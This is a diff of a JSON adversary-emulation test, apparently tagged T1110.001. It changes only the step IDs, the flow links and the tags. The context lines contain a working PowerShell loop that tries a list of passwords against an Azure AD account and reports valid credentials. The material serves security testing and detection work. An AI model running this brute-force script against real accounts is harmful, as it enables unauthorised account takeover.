@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "e4d3af8e-dc7b-40d7-8560-7e7ecbc3eb15",
+      "id": "f163cb10-f175-45fa-a0b5-546e6b0c2db9",
       "type": "execute-command",
       "data": {
         "command": "Import-Module -Name AzureAD\n\n$passwords = \"#{passwords}\".split(\"{`n}\")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{username}.\"\n    Connect-AzureAD -Credential $Credential 2\u003e\u00261\u003e $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{username}:${password} are valid credentials!`r`n\"\n    break\n  } catch {\n    Write-Host \" [-] #{username}:${password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of bruteforce\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "23167072-0a63-4518-adaf-207490a2ef48",
+      "id": "08451f43-cf8a-4258-8e3e-1d31e0ece410",
       "name": "Check dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "90eec722-8854-47b0-ab03-0241ed28c7ab",
+      "id": "d630f7e8-7a75-444f-8ba7-19367ff4ba38",
       "name": "Resolve dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "22565388-f8e8-4b02-b8fa-e7cfa183b552",
+      "id": "b9b8ab37-06e2-4db8-bfbd-7a8349110f3c",
       "name": "Re-check dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -51,29 +51,29 @@
   ],
   "flows": [
     {
-      "s": "23167072-0a63-4518-adaf-207490a2ef48",
+      "s": "08451f43-cf8a-4258-8e3e-1d31e0ece410",
       "p": "on-success",
-      "o": "e4d3af8e-dc7b-40d7-8560-7e7ecbc3eb15"
+      "o": "f163cb10-f175-45fa-a0b5-546e6b0c2db9"
     },
     {
-      "s": "23167072-0a63-4518-adaf-207490a2ef48",
+      "s": "08451f43-cf8a-4258-8e3e-1d31e0ece410",
       "p": "on-failure",
-      "o": "90eec722-8854-47b0-ab03-0241ed28c7ab"
+      "o": "d630f7e8-7a75-444f-8ba7-19367ff4ba38"
     },
     {
-      "s": "90eec722-8854-47b0-ab03-0241ed28c7ab",
+      "s": "d630f7e8-7a75-444f-8ba7-19367ff4ba38",
       "p": "on-success",
-      "o": "22565388-f8e8-4b02-b8fa-e7cfa183b552"
+      "o": "b9b8ab37-06e2-4db8-bfbd-7a8349110f3c"
     },
     {
-      "s": "22565388-f8e8-4b02-b8fa-e7cfa183b552",
+      "s": "b9b8ab37-06e2-4db8-bfbd-7a8349110f3c",
       "p": "on-failure",
-      "o": "e4d3af8e-dc7b-40d7-8560-7e7ecbc3eb15"
+      "o": "f163cb10-f175-45fa-a0b5-546e6b0c2db9"
     }
   ],
   "tags": [
-    "T1110.001",
-    "atomic-red-team"
+    "T1110",
+    "T1110.001"
   ],
   "input_arguments": [
     {
